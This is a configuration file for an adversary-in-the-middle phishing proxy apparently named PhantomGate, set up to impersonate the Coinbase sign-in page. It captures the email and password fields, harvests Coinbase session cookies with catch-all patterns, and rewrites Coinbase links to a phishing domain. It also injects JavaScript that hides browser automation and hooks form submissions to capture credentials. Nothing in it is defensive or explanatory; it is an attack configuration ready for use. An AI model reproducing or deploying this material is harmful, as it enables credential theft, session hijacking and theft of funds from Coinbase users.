name: Coinbase
author: PhantomGate
version: 2.0.0
description: Coinbase authentication - Pixel-perfect replica

auth:
  domains:
    - coinbase.com
    - www.coinbase.com
    - login.coinbase.com
  
  login:
    domain: www.coinbase.com
    path: /signin
    username:
      selector: "input#email_or_phone"
      capture: true
    password:
      selector: "input#password"
      capture: true
  
  tokens:
    cookies:
      - name: cbpt
        regex: ".*"
      - name: cbpa
        regex: ".*"
      - name: cft
        regex: ".*"
      - name: __cf_bm
        regex: ".*"

proxy:
  hosts:
    - domain: coinbase.com
      inject: true
    - domain: www.coinbase.com
      inject: true
  
  sub_filters:
    - domain: coinbase.com
      search: "https://www.coinbase.com"
      replace: "https://{phishing_domain}"

injection:
  js: |
    // PhantomGate Injection - Coinbase
    (function() {
      'use strict';
      
      // Override navigator properties
      Object.defineProperty(navigator, 'webdriver', {get: () => false});
      
      // Capture form submissions
      document.addEventListener('submit', function(e) {
        var form = e.target;
        var username = form.querySelector('#email_or_phone');
        var password = form.querySelector('#password');
        if (username && password) {
          console.log('[PhantomGate] Coinbase credentials captured');
        }
      }, true);
    })();
